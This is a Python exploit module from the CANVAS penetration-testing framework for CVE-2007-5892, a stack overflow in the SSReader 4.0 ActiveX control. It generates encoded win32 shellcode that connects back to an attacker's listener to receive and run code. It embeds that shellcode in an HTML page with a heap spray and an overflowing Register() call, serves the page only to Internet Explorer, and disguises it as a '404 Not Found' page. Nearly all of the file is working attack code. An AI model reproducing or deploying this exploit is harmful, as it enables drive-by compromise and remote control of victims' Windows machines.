#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from encoder import xorencoder, nibble_encoder
from shellcode import shellcodeGenerator, win32shell 
import binascii

NAME="SSReader 4.0 Stack based buffer overflow"
DESCRIPTION="Stack-based buffer overflow in the pdg2.dll ActiveX control in SSReader 4.0"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="SSReader"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"] = "CVE-2007-5892"
DOCUMENTATION["CVE URL"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5892"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Date public"] = "11/07/2007"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "98","ME","2000","XP","2003" ]
PROPERTY['MSADV'] = ""
PROPERTY['DELIVERY']='HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:ssreader -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

DEBUGNOTES="""
An Stack Overflow allows us to overwrite a ret-adrress and point it to our buffer.
We use a memory filler to assure that our shellcode is placed in a known place.
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setVersions()
        self.version=1
        self.name=NAME
        self.filename="ssreader.html"
        self.listenerArgsDict["fromcreatethread"]=1
        self.badstring="\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        sc=shellcodeGenerator.win32()                                                                                        
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect",{"port":self.callback.port,"ipaddress":self.callback.ip})                                                              
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("TerminateThread",None)

        rawshellcode=sc.get()
        
        print "[!] RAW Shellcode len: %d bytes" % len(rawshellcode)
        
        #first encode to nibble
        enc = nibble_encoder.intel_nibbleencoder()
        bad = ""
        for i in range(ord('A'),ord('Z')+1):
            #for a-z inclusive, these are badchars
            bad+=chr(i)
        enc.setbadstring(bad)
        rawshellcode = enc.encode(rawshellcode)
        
        print "[!] Nibble Encoded Shellcode len: %d bytes" % len(rawshellcode)
        
        #then do a xor enconding using the real badstring
        encoder = xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        encoder.find_key(rawshellcode)
        self.shellcode = encoder.encode(rawshellcode)
                
        print "[!] Shellcode len: %d bytes" % len(self.shellcode)
        
        if not len(self.shellcode):
            return None
        
        #we need an odd length
        if len(self.shellcode) % 2: self.shellcode += "\x90"
        
        return self.shellcode
   
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
    
    def makefile(self):
        """Makes the html"""
        if not self.createShellcode():
            return None
        
        html="""
        <html>
        <object id='obj' classid='clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2'>
        <embed width="1" height="1"></embed>
        </OBJECT>
        <script language="javascript">
        """
        
        html += "var sc = unescape(\""
        
        tmp = binascii.b2a_hex(self.shellcode)
        for x in range(0,len(tmp),4):
            html += "%u" + tmp[x+2:x+4] + tmp[x:x+2]
        html += "\");\r\n"
        html += """var buffer = "";
var mem = "";

while (mem.length < (0x40000 - sc.length)) mem += unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090");

array = new Array();
for (i=0;i<256;i++) array[i] = mem + sc;

while (buffer.length < 1024) buffer+="\x05";
obj.Register("",buffer);
        </script>
        <head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        The requested URL / was not found on this server.<p>
        <hr>
        </body>
        
        </html>
        """
            
        return html
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0:
            self.log("Non IE browser connected - returning None")
            return None,None
        
        
        sploitstring = self.makefile()
        self.log("Sending %d bytes"%len(sploitstring))
        h.addHeader("Content-type","text/html")
        h.addHeader("Connection","close")
        b.setBody(sploitstring)
                    
        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
